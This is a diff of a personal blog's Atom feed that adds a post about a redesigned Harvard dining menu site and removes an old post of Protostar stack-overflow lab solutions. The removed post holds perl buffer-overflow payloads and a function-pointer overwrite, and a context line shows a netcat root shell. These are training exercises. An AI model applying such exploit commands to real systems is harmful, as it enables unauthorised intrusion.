@@ -4,7 +4,7 @@
   <title><![CDATA[Category: projects | Louis Li]]></title>
   <link href="http://louisrli.github.io/blog/categories/projects/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2013-08-18T03:08:36-04:00</updated>
+  <updated>2013-08-22T01:38:32-04:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -12,6 +12,19 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hungrier: Harvard Dining Menu, Re-released]]></title>
+    <link href="http://louisrli.github.io/blog/2013/08/22/hungry-revamped/"/>
+    <updated>2013-08-22 00:00:00 -0400</updated>
+    <id>http://louisrli.github.io/blog/2013/08/22/hungry-revamped</id>
+    <content type="html"><![CDATA[<p>I&rsquo;ve rewritten and redesigned <a href="http://louisrli.github.io/hungry/">Hungry</a>, a site that filters the noisy Harvard dining menu for relevant entries. If you&rsquo;re reading this during the school year, there probably won&rsquo;t be anything, since student dining isn&rsquo;t open.</p>
+
+<p>This version was written in <a href="http://marionettejs.com">Marionette.js</a>, which has been my client-side framework of choice for the past few months (I&rsquo;ve been using Meteor for things that require a more involved database). It still retains an obnoxious minimalism, but this time with lowercase text instead of uppercase text.</p>
+
+<p><a href="https://github.com/louisrli/hungry">Source code here</a>, contributions welcome.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[2012 in Sideprojects]]></title>
@@ -864,70 +877,6 @@ $ echo -n $(perl -e &amp;lsquo;print &amp;ldquo;\xce\xfe\xff\xbf&quot;x25&amp;rs
   <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
 whoami
 root</code></pre>
-</div>
-</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
-    <updated>2012-08-18 00:00:00 -0400</updated>
-    <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
-    <content type="html"><![CDATA[<h1>Overview</h1>
-
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
-
-<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
-
-<h1>Solutions</h1>
-
-<h2>Stack: Level 0</h2>
-
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
-
-<p><div>
-  <pre><code class='console'>$ perl -e &amp;ldquo;print &amp;lsquo;a'x65&amp;rdquo; | ./stack0
-you have changed the 'modified&amp;rsquo; variable</code></pre>
-</div>
-</p>
-
-<h2>Stack: Level 1</h2>
-
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
-
-<p><div>
-  <pre><code class='console'>$ ./stack1 $(perl -e &amp;ldquo;print &amp;lsquo;a'x64 . dcba&amp;rdquo;)
-you have correctly got the variable to the right value</code></pre>
-</div>
-</p>
-
-<!-- more -->
-
-
-<h2>Stack: Level 2</h2>
-
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>
-
-<p><div>
-  <pre><code class='console'>$ export GREENIE=$(echo -e &amp;ldquo;$(perl -e &quot;print ax64&amp;rdquo;)\n\r\n\r&quot;)
-$ ./stack2
-you have correctly modified the variable</code></pre>
-</div>
-</p>
-
-<h2>Stack: Level 3</h2>
-
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>
-
-<p><div>
-  <pre><code class='console'>$ objdump -d ./stack3 | grep win
-08048424 &lt;win&gt;:
-$ echo -e &amp;ldquo;$(perl -e &quot;print &amp;lsquo;a'x64&amp;rdquo;)\x24\x84\x04\x08&quot; | ./stack3
-calling function pointer, jumping to 08048424
-code flow successfully changed</code></pre>
 </div>
 </p>
 ]]></content>
